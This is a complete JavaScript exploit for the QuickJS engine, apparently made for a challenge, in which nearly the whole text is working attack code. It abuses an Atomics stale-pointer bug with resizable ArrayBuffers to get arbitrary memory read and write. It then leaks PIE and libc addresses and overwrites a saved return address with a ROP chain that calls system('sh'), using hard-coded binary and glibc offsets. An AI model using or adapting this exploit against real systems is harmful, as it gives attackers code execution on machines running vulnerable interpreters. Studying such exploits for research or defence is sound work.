// exec-shell-cfi exploit for QuickJS (strict CFI + Full RELRO)
//
// Uses Atomics stale-pointer bug with resizable ArrayBuffers to corrupt a freshly
// allocated JSArrayBuffer struct's `data` pointer, giving arbitrary read/write.
// Then leaks PIE+libc, locates the saved return address of eval_buf on stack,
// and overwrites it with a ROP chain to system("sh").

function asInt64(x) {
  return BigInt.asIntN(64, x);
}

const KEEP = [];

// qjs offsets (CFI build)
const OFF_JS_ARRAY_BUFFER_FREE = 0x107df0n;
const OFF_GOT_REALLOC = 0x111788n;
const OFF_RET_AFTER_EVAL_BUF_CALL = 0x3e27fn; // return address pushed by `call eval_buf`

// glibc 2.41 offsets
const OFF_REALLOC = 0x0a3590n;
const OFF_SYSTEM  = 0x053110n;
const OFF_EXIT    = 0x042340n;
const OFF_ENVIRON = 0x1eee28n;

// glibc gadgets
const OFF_POP_RDI_RET = 0x000000000002a145n; // pop rdi ; ret
const OFF_RET         = 0x000000000002846bn; // ret

function leak_pie_base() {
  // backing-store size 0x38 (56) so freed chunk cannot satisfy the JSObject (72)
  // allocation during new ArrayBuffer(), forcing reuse for JSArrayBuffer struct.
  let ab = new ArrayBuffer(0x38, { maxByteLength: 0x10000 });
  let ta = new BigInt64Array(ab);
  KEEP.push(new ArrayBuffer(0x1000));

  let mal = {
    valueOf() {
      ab.resize(0x8000);
      KEEP.push(new ArrayBuffer(0x20));
      return 1n;
    }
  };

  // free_func at offset 0x30 => index 6
  let leak = Atomics.compareExchange(ta, 6, 0n, mal);
  return leak - OFF_JS_ARRAY_BUFFER_FREE;
}

function make_dv(target_addr, byte_len) {
  let ab = new ArrayBuffer(0x38, { maxByteLength: 0x10000 });
  let ta = new BigInt64Array(ab);
  KEEP.push(new ArrayBuffer(0x1000));

  let victim;
  let mal = {
    valueOf() {
      ab.resize(0x8000);
      victim = new ArrayBuffer(byte_len);
      return asInt64(target_addr);
    }
  };

  // data pointer at offset 0x10 => index 2
  Atomics.exchange(ta, 2, mal);
  KEEP.push(victim);
  return new DataView(victim);
}

function read64(addr) {
  return make_dv(addr, 0x20).getBigUint64(0, true);
}

function find_saved_rip_slot(envp, wanted_rip) {
  // In practice envp is within ~0x1000 of the active stack frames for qjs.
  // We scan a window below envp and take the HIGHEST match (closest to envp),
  // which corresponds to the current eval_buf frame.
  const scan_len = 0x8000n;
  let scan_start = envp - scan_len;
  let dv = make_dv(scan_start, Number(scan_len));

  let slot = 0n;
  for (let off = 0; off < Number(scan_len); off += 8) {
    let v = dv.getBigUint64(off, true);
    if (v === wanted_rip) {
      slot = scan_start + BigInt(off); // keep updating; last match wins
    }
  }
  return slot;
}

(function main() {
  let pie_base = leak_pie_base();

  let realloc_ptr = read64(pie_base + OFF_GOT_REALLOC);
  let libc_base = realloc_ptr - OFF_REALLOC;

  let envp = read64(libc_base + OFF_ENVIRON);

  let wanted_rip = pie_base + OFF_RET_AFTER_EVAL_BUF_CALL;
  let slot = find_saved_rip_slot(envp, wanted_rip);
  if (slot === 0n) {
    // fallback: bigger scan
    const scan_len = 0x30000n;
    let scan_start = envp - scan_len;
    let dv = make_dv(scan_start, Number(scan_len));
    for (let off = 0; off < Number(scan_len); off += 8) {
      let v = dv.getBigUint64(off, true);
      if (v === wanted_rip) slot = scan_start + BigInt(off);
    }
    if (slot === 0n) throw new Error('saved RIP not found');
  }

  // Overwrite saved RIP with ROP chain.
  let pop_rdi = libc_base + OFF_POP_RDI_RET;
  let ret = libc_base + OFF_RET;
  let system = libc_base + OFF_SYSTEM;
  let exit = libc_base + OFF_EXIT;

  let cmd_addr = slot + 0x80n;

  let w = make_dv(slot, 0x200);
  w.setBigUint64(0x00, ret, true);
  w.setBigUint64(0x08, pop_rdi, true);
  w.setBigUint64(0x10, cmd_addr, true);
  w.setBigUint64(0x18, system, true);
  w.setBigUint64(0x20, pop_rdi, true);
  w.setBigUint64(0x28, 0n, true);
  w.setBigUint64(0x30, exit, true);

  // "sh\0" on stack
  w.setUint8(0x80, 0x73);
  w.setUint8(0x81, 0x68);
  w.setUint8(0x82, 0x00);
})();
